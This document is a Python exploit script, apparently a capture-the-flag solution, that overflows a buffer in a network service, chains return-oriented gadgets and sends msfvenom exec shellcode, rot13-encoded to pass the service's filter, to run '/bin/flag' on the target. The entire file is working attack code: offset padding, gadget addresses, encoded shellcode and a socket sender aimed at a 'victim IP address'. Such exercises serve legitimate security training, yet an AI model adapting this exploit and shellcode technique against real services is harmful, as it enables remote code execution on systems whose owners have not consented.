import argparse
import codecs
import socket
import struct

offset = 'A'*24

# CAUTION: any ASCII range value will be rot13
push_rsp = 0x52753e  # 0x45683e
pop_rax = 0x40ec77  # 0x40ec6a
call_rax = 0x4003dc

# msfvenom -p linux/x64/exec CMD="/bin/flag nbsantos@gmail.com" -f python
# buf =  b""
# buf += b"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
# buf += b"\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
# buf += b"\x52\xe8\x1d\x00\x00\x00\x2f\x62\x69\x6e\x2f\x66\x6c"
# buf += b"\x61\x67\x20\x6e\x62\x73\x61\x6e\x74\x6f\x73\x40\x67"
# buf += b"\x6d\x61\x69\x6c\x2e\x63\x6f\x6d\x00\x56\x57\x48\x89"
# buf += b"\xe6\x0f\x05"

buf =  b""
buf += b"\x77\x3b\x4b\x99\x55\xbb\x2f\x6f"
buf += b"\x76\x61\x2f\x66\x75\x00\x46\x55"
buf += b"\x89\xe7\x75\x2d\x70\x00\x00\x55"
buf += b"\x89\xe6\x45\xe8\x1d\x00\x00\x00"
buf += b"\x2f\x6f\x76\x61\x2f\x73\x79\x6e"
buf += b"\x74\x20\x61\x6f\x66\x6e\x61\x67"
buf += b"\x62\x66\x40\x74\x7a\x6e\x76\x79"
buf += b"\x2e\x70\x62\x7a\x00\x49\x4a\x55"
buf += b"\x89\xe6\x0f\x05"

junk = b"\x90"*500

def rot13(s: str) -> bytes:
    return codecs.encode(s, 'rot_13').encode()

def pack(a: int) -> bytes:
    return struct.pack('<Q', a)

def exploit(ip: str, port: int, payload: bytes):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, port))
        print(s.recv(1024).decode())
        s.sendall(payload)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Hack the planet!')
    parser.add_argument('-d', metavar='DESTINATION', default='127.0.0.1',
        help='victim IP address')
    parser.add_argument('-p',metavar='PORT', type=int, default=2888,
        help='service port number')
    args = parser.parse_args()

    payload = rot13(offset) + pack(push_rsp) + pack(pop_rax) + pack(call_rax) + buf + junk

    exploit(args.d, args.p, payload)
